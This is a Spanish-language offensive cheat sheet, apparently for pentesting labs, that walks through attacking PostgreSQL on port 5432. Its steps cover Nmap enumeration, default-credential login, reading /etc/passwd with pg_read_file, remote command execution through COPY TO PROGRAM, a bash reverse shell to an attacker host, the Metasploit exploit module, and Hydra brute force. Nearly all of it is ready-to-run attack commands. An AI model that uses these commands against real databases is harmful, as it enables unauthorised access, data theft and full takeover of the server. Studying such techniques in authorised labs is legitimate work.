# Enumeración y Ataque — PostgreSQL (Puerto 5432)

## Descripción

PostgreSQL es un sistema de gestión de bases de datos relacional muy usado en entornos Linux. A diferencia de MySQL, su usuario por defecto es `postgres`. Permite ejecución de comandos del sistema mediante la función `COPY`.

**Puerto por defecto:** 5432

---

## Paso 1 — Enumeración con Nmap

```shell
nmap -p 5432 -sV -sC TARGET_IP
```

---

## Paso 2 — Conexión con credenciales por defecto

```shell
psql -h TARGET_IP -U postgres
# Contraseña: postgres / (vacía) / password

# Con Metasploit
use auxiliary/scanner/postgres/postgres_login
set RHOSTS TARGET_IP
run
```

---

## Paso 3 — Enumeración interna

```sql
\list                           -- Listar bases de datos
\c nombre_db                    -- Conectar a base de datos
\dt                             -- Listar tablas
SELECT * FROM usuarios;        -- Ver contenido
SELECT version();              -- Versión de PostgreSQL
SELECT current_user;           -- Usuario actual
SELECT pg_read_file('/etc/passwd', 0, 1000000);  -- Leer archivos (si tiene permisos)
```

---

## Paso 4 — RCE con COPY TO/FROM PROGRAM ⭐

Si el usuario es superusuario (postgres normalmente lo es):

```sql
-- Ejecutar comandos del sistema
COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt';
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"';
```

Con Metasploit:

```shell
use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS TARGET_IP
set USERNAME postgres
set PASSWORD postgres
set LHOST KALI_IP
run
```

---

## Paso 5 — Fuerza bruta

```shell
hydra -l postgres -P /usr/share/wordlists/rockyou.txt postgresql://TARGET_IP

use auxiliary/scanner/postgres/postgres_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## Checklist rápido

```
[ ] psql -h TARGET -U postgres (sin contraseña)
[ ] Credenciales por defecto (postgres:postgres)
[ ] \list → \dt → SELECT * para buscar datos
[ ] COPY TO PROGRAM → RCE si es superusuario
[ ] Metasploit postgres_copy_from_program
[ ] Fuerza bruta con Hydra si nada funciona
```
